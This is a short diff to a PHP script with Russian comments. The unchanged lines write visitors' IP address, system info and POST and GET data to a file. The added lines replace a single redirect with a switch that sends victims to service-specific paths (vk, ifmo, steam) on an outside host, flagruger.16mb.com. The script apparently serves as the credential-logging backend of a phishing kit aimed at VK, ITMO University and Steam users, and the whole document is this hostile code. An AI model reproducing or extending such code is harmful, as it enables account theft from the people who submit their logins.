@@ -12,6 +12,20 @@ $res="\n$data  |  $ip  |  $sysinfo |  $res4 |\nPOST: $res2 \nGET: $res3";
 $fw=fwrite($fo,$res); //Записываем в файл 
 fclose($fo); //Закрываем файл 
 }
-header("Location: http://flagruger.16mb.com/call.html"); //редирект
-die();
+//перенаправление на другой сайт
+$service  = $res4;
+$service  = substr($service,26);
+$service  = substr($service,0,stripos($service,"/"));
+echo($service);
+switch ($service){
+    case "vk":
+        header("Location: http://flagruger.16mb.com/vk/");
+        die(); break;
+    case "ifmo":
+        header("Location: http://flagruger.16mb.com/ifmo/");
+        die(); break;
+    case "steam":
+        header("Location: http://flagruger.16mb.com/steam/");
+        die(); break;
+}
 ?>
